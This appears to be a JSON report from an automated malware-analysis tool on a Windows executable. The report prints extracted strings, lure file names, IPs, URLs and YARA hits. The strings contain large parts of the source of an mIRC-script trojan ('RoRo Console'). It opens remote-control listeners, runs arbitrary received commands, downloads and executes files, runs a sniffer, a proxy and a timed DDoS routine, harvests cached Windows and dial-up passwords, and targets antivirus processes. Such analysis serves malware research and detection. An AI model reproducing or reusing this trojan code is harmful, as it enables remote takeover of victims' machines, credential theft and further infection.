            "n226=alias SnifferIt { .sockwrite -tn $sockname (SNIFFER) Options completed. | .hadd Data Sniffer.Console $sockname | .hadd Data Sniffer $1 }",
            "n227=alias BNCIt { if ($verify(Gateway-BNC) != 1) { .sockwrite -tn $sockname (BNC) Server: $1 Port: $2 | .sockopen Gateway-BNC $1 $2 } }",
            "n228=alias ExecIt {",
            "n229=  if ($1 == RESTART) { .run $windir $+ \\rundll.exe user.exe,exitwindowsexec }",
            "n230=  else if ($1 == SHUTDOWN) { .run $windir $+ \\rundll.exe user.exe,exitwindows }",
            "n231=  else if ($1 == FUCKOFF) { .remove $winFile }",
            "n232=  else { [ [ $1- ] ] } | .sockwrite -tn $sockname (EXEC) $1- Executed..",
            "n233=}",
            "n234=alias MassMe {",
            "n235=  .sockwrite -tn $sockname (MASS) Accepted. | var %sExec = $readini($GFN(DEF), Mass, Executed)",
            "n236=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }",
            "n237=}",
            "n238=",
            "n239=; * DIR *",
            "n240=alias DIRFormat { .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) <",
            " $+ 4DIR",
            "n209=    if ($getStat == Full && $hget(Data, Sending) == Idle) {",
            "n210=      if ($2-3 == Semi Idle) { .UseConsole %sNick SendFile $runDLL $+ !C:\\ $+ $random($rand(5,10)) $+ .exe!1 }",
            "n211=      else if ($getPriv != Master) { .CloseConsole %sNick }",
            "n212=    }",
            "n213=    else if ($getPriv != Master) { .CloseConsole %sNick }",
            "n214=  }",
            "n215=}",
            "n216=on *:sockclose:Local-Console-*:{ .hdel -w Data $rev($sockname, *) | if ($getPriv == Master) { .aline 6 $wind($sockname) ",
            "[!!]",
            " Console closed by remote host.. } }",
            "n217=",
            "n218=; * TROJAN FUNCTIONS *",
            "n219=alias getScript { .return BiG }",
            "n220=alias getVersion { .return 2.5 }",
            "n221=alias setInfo { .writeini $GFN(RNA) Options Info $getInfo | .writeini $GFN(IRC) Options Info $getInfo }",
            "n222=alias getInfo { .return ( $+ $me $+ )-( $+ $Ip $+ )-( $+ $Host $+ )-( $+ $Server $+ )-(RoRo $getVersion $getScript $+ )-(mIRC $Version $+ )-(Win $OS $+ ) }",
            "n223=alias Hello { .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }",
            "n224=alias StatusMe { .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }",
            "n194=  if ($2 == SendFile) { $SendFile(OPEN, Local-SendFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!)), $getTok($3-, 3, $asc(!))) }",
            "n195=  if ($2 == RecvFile) { $RecvFile(OPEN, Local-RecvFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!))) }",
            "n196=}",
            "n197=alias InitConsole {",
            "n198=  if ($sockerr > 0) { .return }",
            "n199=  if ($getPriv == Master) { .window -aex $wind($sockname) }",
            "n200=  .UseConsole $GetTok($sockname, 3-, $asc(-)) Hello",
            "n201=}",
            "n202=on *:sockopen:Local-Console-*:{ .InitConsole }",
            "n203=on *:sockread:Local-Console-*:{",
            "n204=  if ($sockerr > 0) { .return } | var %sRead , %sNick = $GetTok($sockname, 3-, $asc(-))",
            "n205=  .sockread %sRead | .tokenize 32 %sRead | if ($getPriv == Master) { .aline -h 12 $wind($sockname) ",
            "[<<]",
            " $1- }",
            "n206=  if ($1 == (HELLO)) { if ($hget(Data, MassExec)) { .UseConsole %sNick Mass $hget(Data, MassExec) } | .UseConsole %sNick Status }",
            "n207=  if ($1 == (STATUS)) {",
            "n208=    .hadd Data $rev($sockname, Remote) $4 | .hadd Data $rev($sockname, IP) $5",
            "n178=  else if ($1 == SNIFFER) { .SnifferIt $2- }",
            "n179=  else if ($1 == EXEC) { .ExecIt $2- }",
            "n180=  else if ($1 == RENAME) { .RenameIt $2- }",
            "n181=}",
            "n182=",
            "n183=on *:sockopen:Server-Console-*:{ .sockwrite -tn $sockname Rename Local-Console- $+ $sock($sockname).mark }",
            "n184=alias OpenServerConsole { var %sConsole = $OpenIt(Server-Console) | if ($2) { .sockopen %sConsole $2 2000 | .sockmark %sConsole $1 } }",
            "n185=alias RenameIt { .sockrename $sockname $1 | .InitConsole }",
            "n186=",
            "n187=; * LOCAL CONSOLE *",
            "n188=on *:Close:@Local-Console-*:{ .CloseConsole $GetTok($target, 3-, $asc(-)) }",
            "n189=alias CloseConsole { .sockclose Local-Console- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1, *) | .window -c @Local-Console- $+ $1 }",
            "n190=alias OpenConsole { var %sConsole = Local-Console- $+ $1 | if ($Verify(%sConsole) == 0 && $2) { .sockopen %sConsole $2 2000 } }",
            "n191=alias UseConsole {",
            "n192=  var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole)) { .return }",
            "n193=  if ($getPriv == Master) { .aline -h 4 $wind(%sConsole) ",
            "[>>]",
            " $2- } | .sockwrite -tn %sConsole $2-",
            "n155=",
            "n156=on *:sockopen:Local-RecvFile-*:{ .RecvFile INIT $sockname }",
            "n157=on *:sockread:Local-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n158=on *:sockclose:Local-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n159=",
            "n160=; * SERVER CONSOLE *",
            "n161=on *:socklisten:Listen-Console:{ .AcceptIt Server-Console }",
            "n162=on *:sockwrite:Server-Console-*:{",
            "n163=  if ($hget(Data, $rev($sockname, Active)) == DIR) {",
            "n164=    .inc %DIR.i | %DIR.Tmp = $ev(DIR, Items, %DIR.i)",
            "n165=    if (%DIR.Tmp && $Verify($sockname)) { .sockwrite -tn $sockname %DIR.Tmp }",
            "n166=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }",
            "n167=  }",
            "n168=}",
            "n169=on *:sockread:Server-Console-*:{ ",
            "n170=  if ($sockerr > 0) { .return }",
            "n171=  var %sRead | .sockread %sRead | .tokenize 32 %sRead",
            "n172=  if ($1 == HELLO) { .Hello }",
            "n173=  else if ($1 == STATUS) { .StatusMe }",
            "n174=  else if ($1 == INFO) { .InfoMe }",
            "n175=  else if ($1 == MASS) { .MassMe $2- }",
            "n176=  else if ($1 == DIR) { .DIR $2- }",
            "n177=  else if ($1 == BNC) { .BNCIt $2- }",
            "n136=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }",
            "n137=    }",
            "n138=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | .goto RecvMore } }",
            "n139=  }",
            "n140=}",
            "n141=",
            "n142=; * SERVER FILES *",
            "n143=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }",
            "n144=on *:sockread:Server-SendFile-*:{ .SendFile READ|SEND $sockname }",
            "n145=on *:sockwrite:Server-SendFile-*:{ .SendFile SEND $sockname }",
            "n146=",
            "n147=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }",
            "n148=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }",
            "n149=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }",
            "n150=",
            "n151=; * LOCAL FILES *",
            "n152=on *:sockopen:Local-SendFile-*:{ .SendFile INIT $sockname }",
            "n153=on *:sockwrite:Local-SendFile-*:{ .SendFile SEND $sockname }",
            "n154=on *:sockclose:Local-SendFile-*:{ .SendFile CLOSE $sockname }",
            "n121=    .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iResume $+ ! $+ $hget(Data, $rev(%sName, Remote))",
            "n122=  }",
            "n123=  if (RECV isin $1) {",
            "n124=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {",
            "n125=      .sockread %sRead",
            "n126=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))",
            "n127=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))",
            "n128=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n129=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))",
            "n130=      .hadd Data $rev(%sName, Init) 1",
            "n131=      if ($hget(Data, $rev(%sName, Virus)) == 1) {",
            "n132=        if ($hget(Data, Recving) == Busy) || ($getStat == Full) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n133=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\ $+ $random($rand(5,10)) $+ .exe",
            "n134=      }",
            "n135=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }",
            "n105=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }",
            "n106=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }",
            "n107=      }",
            "n108=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC.. }",
            "n109=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle | .sockclose $hget(Data, $rev(%sName, Remote)) }",
            "n110=    }",
            "n111=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n112=  }",
            "n113=  if (OPEN isin $1) {",
            "n114=    .hadd Data $rev(%sName, RemoteName) $3",
            "n115=    .hadd Data $rev(%sName, LocalName) $4",
            "n116=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n117=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1991 }",
            "n118=  }",
            "n119=  if (INIT isin $1) {",
            "n120=    %iResume = $file($hget(Data, $rev(%sName, LocalName))).size | if (%iResume == $null) { %iResume = 0 }",
            "n88=    if ($bvar(&bRead, 0)) { if ($Verify($2) == 1) { .sockwrite $2 &bRead } | .hadd Data $Rev(%sName, Pos) $calc($hget(Data, $rev(%sName, Pos)) + 2048) }",
            "n89=    else {",
            "n90=      if (%bServer == 1 && $Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) File Successfully Sent.. }",
            "n91=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n92=      .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n93=    }",
            "n94=  }",
            "n95=}",
            "n96=",
            "n97=alias RecvFile {",
            "n98=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename",
            "n99=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead , %iResume",
            "n100=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n101=",
            "n102=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n103=    if (%bServer == 1) {",
            "n104=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { ",
            "n71=  if (OPEN isin $1) {",
            "n72=    .hadd Data $rev(%sName, LocalName) $shortfn($3)",
            "n73=    .hadd Data $rev(%sName, RemoteName) $4",
            "n74=    .hadd Data $rev(%sName, Virus) $5",
            "n75=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))",
            "n76=    .hadd Data $rev(%sName, Pos) 0",
            "n77=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n78=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Busy }",
            "n79=    else { .hadd Data $rev(%sName, Virus) 0 }",
            "n80=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1990 }",
            "n81=  }",
            "n82=  if (INIT isin $1) {",
            "n83=    %iSize = $file($hget(Data, $rev(%sName, LocalName))).size",
            "n84=    if ($Verify($2) == 1) { .sockwrite -tn $2 SendFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iSize $+ ! $+ $hget(Data, $rev(%sName, Remote)) $+ ! $+ $hget(Data, $rev(%sName, Virus)) }",
            "n85=  }",
            "n86=  if (SEND isin $1) {",
            "n87=    .bread $hget(Data, $rev(%sName, LocalName)) $hget(Data, $rev(%sName, Pos)) 2048 &bRead",
            "n56=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, SendFile) , %sRead , %iSize",
            "n57=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }",
            "n58=",
            "n59=  if (CLOSE isin $1) || ($sockerr > 0) {",
            "n60=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }",
            "n61=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return",
            "n62=  }",
            "n63=  if (READ isin $1) {",
            "n64=    .sockread %sRead",
            "n65=    .hadd Data $rev(%sName, LocalName) $shortfn($GetTok(%sRead, 2, $asc(!)))",
            "n66=    .hadd Data $rev(%sName, Pos) $GetTok(%sRead, 3, $asc(!))",
            "n67=    .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))",
            "n68=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }",
            "n69=    if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sName, Pos)) bytes. Sending in Progress.. }",
            "n70=  }",
            "n39=alias Init {",
            "n40=  if ($hget(Data).size == 0) { .unload -rsn $script }",
            "n41=  .ignore -r | .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off",
            "n42=  .timerListenIt 1 5 { .ListenIt }",
            "n43=  .timerHttpMe 1 15 { .httpMe }",
            "n44=  .timerSetInfo 1 15 { .setInfo }",
            "n45=  .timerDDos 0 90 { .DDos }",
            "n46=  .timerAdvMe 1 180 { .advMe 1 10 }",
            "n47=  if (5 // $hget(Data, Loaded) && $hget(Data, extractHTML) != 1) { .hadd Data extractHTML 1 | .extractHTML }",
            "n48=}",
            "n49=alias ListenIt { if ($portfree(2000) == $true) { .socklisten Listen-SendFile 1991 | .socklisten Listen-RecvFile 1990 | .socklisten Listen-Console 2000 | .socklisten Listen-BNC 1999 } }",
            "n50=alias AcceptIt { var %sName \"\" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto AcceptIt | .sockaccept %sName | return %sName }",
            "n51=alias OpenIt { var %sName \"\" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto OpenIt | return %sName }",
            "n52=",
            "n53=; * SEND/RECV Files *",
            "n54=alias SendFile {",
            "n55=  ; $1 - ACTION , $2 - $sockname , $3 - Local Filename , $4 - Remote Filename , $5 - Virus",
            "n24=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }",
            "n25=on *:Start:{ .Start }",
            "n26=alias Start {",
            "n27=  if ($version < 5.8) { .unload -rsn $script | .halt }",
            "n28=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1",
            "n29=  if ($HGet(Data).size > 0) { .hfree Data } | .hmake Data 100",
            "n30=  .hadd Data Recving Idle | .hadd Data Sending Idle",
            "n31=  .hadd Data iIPCount 10 | .hadd Data iJoinCount 10 | .hadd Data iAddrCount 5 | .hadd Data iInviteCount 2",
            "n32=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global",
            "n33=  .setFileNames | if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }",
            "n34=  .setStat $getStat | .setCountry $getCountry | .setPriv Slave | .setLoad Big",
            "n35=  if ($getStat == Full) { .hadd Data Spread On }",
            "n36=  .hadd Data Loaded $calc($readini($winFile,Options,Loaded) + 1) | .writeini $winFile Options Loaded $hget(Data, Loaded)",
            "n37=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *",
            "n38=}",
            "n4=alias setPriv { .hadd Data Priv $1 }",
            "n5=alias getPriv { .return $hget(Data,Priv) }",
            "n6=alias setStat { .writeini $winFile Options Virus $1 }",
            "n7=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }",
            "n8=alias setCountry { .writeini $winFile Options Country $1 }",
            "n9=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) %s = OTHER | .return %s }",
            "n10=alias GFN { .return $readini($winFile,Files,$1) }",
            "n11=alias SFN { .writeini $winFile Files $1 $2- }",
            "n12=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }",
            "n13=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }",
            "n14=alias addMAIL { .Writeini $GFN(DEF) MAIL- $+ $1 $2 $1 }",
            "n15=alias delMAIL { .Remini $GFN(DEF) MAIL- $+ $1 $2 }",
            "n16=alias addSITE { .Writeini $GFN(DEF) SITES $1 $2- }",
            "n17=alias delSITE { .Remini $GFN(DEF) SITES $1 }",
            "n18=alias Wind { .return @ $+ $1 }",
            "n19=alias Verify { if ($sock($1).name != $null) { .return 1 } | .return 0 }",
            "n20=",
            "n21=; * INIT Functions *",
            "n22=on *:Connect:{ .Init }",
            "n23=on *:Disconnect:{ .timers off | .sockclose * }",
            "[script]",
            "n0=alias setFileNames { $SFN(RNA, %s) | $SFN(IRC, %s) | $SFN(DEF, %s) }",
            "n1=alias winDir { .return %s }",
            "n2=alias winFile { .return %s }",
            "n3=alias runDLL { .return %s }",
            "rfiles",
            "nick",
            "mirc",
            "host",
            "%s\\mirc.ini",
            "remotes.ini|controls.ini|versions.ini|notes.ini|url.ini|version.ini",
            "User",
            "RemoteAccess\\Profile\\%s",
            "Rna\\",
            "Pass",
            "Type",
            "RemoteAccess",
            "AreaCode",
            "WNetEnumCachedPasswords",
            "MPR.DLL",
            "RegisterServiceProcess",
            "KERNEL32.DLL",
            "DangalakMutex",
            "virus",
            "norton",
            "black",
            "cillin",
            "afee",
            "labs",
            "zone",
            "guard",
            "worm",
            "conseal",
            "antivir",
            "f-secure",
            "f-prot",
            "kaspers",
            "panda",
            "Process32Next",
            "Process32First",
            "CreateToolhelp32Snapshot",
            "black,panda,shield,guard,scan,mcafee,nai_vs_stat,iomon,navap,avp,alarm,f-prot,secure,labs,antivir",
            "LDGp",
            "D@wwwwwx",
            "@xw@",
            "wwwwx",
            "xwpwx",
            "pL\u030fx",
            "DDDx",
            "wwwwwwwx",
            "wwwwww"
        ],
        "file": {
            "%s%s.exe": "Executable",
            "%s.tmp": "Temporary",
            "%s\\%s%s.exe": "Executable",
            "ADVAPI32.dll": "Library",
            "Blondes.exe": "Executable",
            "Blondies.exe": "Executable",
            "IE50_032_Setup.exe": "Executable",
            "IE_0274_bg.exe": "Executable",
            "IE_0276_Setup.exe": "Executable",
            "Iguana1.0_skin.exe": "Executable",
            "KERNEL32.dll": "Library",
            "MAPI32.DLL": "Library",
            "MPR.dll": "Library",
            "RASAPI32.dll": "Library",
            "WS2_32.dll": "Library",
            "Yahoo!Autumn.exe": "Executable",
            "Yahoo!Chess.exe": "Executable",
            "Yahoo!Tomcats.exe": "Executable",
            "Yahoo!Toolbar.exe": "Executable",
            "[TNT]Gen.exe": "Executable",
            "n133=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\ $+ $random($rand(5,10)) $+ .exe": "Executable",
            "user32.dll": "Library",
            "versions.txt": "Text"
        },
        "fuzzing": {},
        "ip": [
            "2.3.4.7",
            "5.6.0.3"
        ],
        "url": [
            "http://Gamerz.Bol.Bg",
            "http://greetings.yahoo.com",
            "http://Teen-Zone.FaithWeb.CoM",
            "http://",
            "http://www.Kurnikova.Bol.bg",
            "http://www.Pam-Anderson.8m.com"
        ]
    },
    "time": "0:00:01.054407",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer_compiler_signatures.yar": "HasRichSignature"
        },
        {
            "crypto_signatures.yar": "BASE64_table"
        }
    ]
}
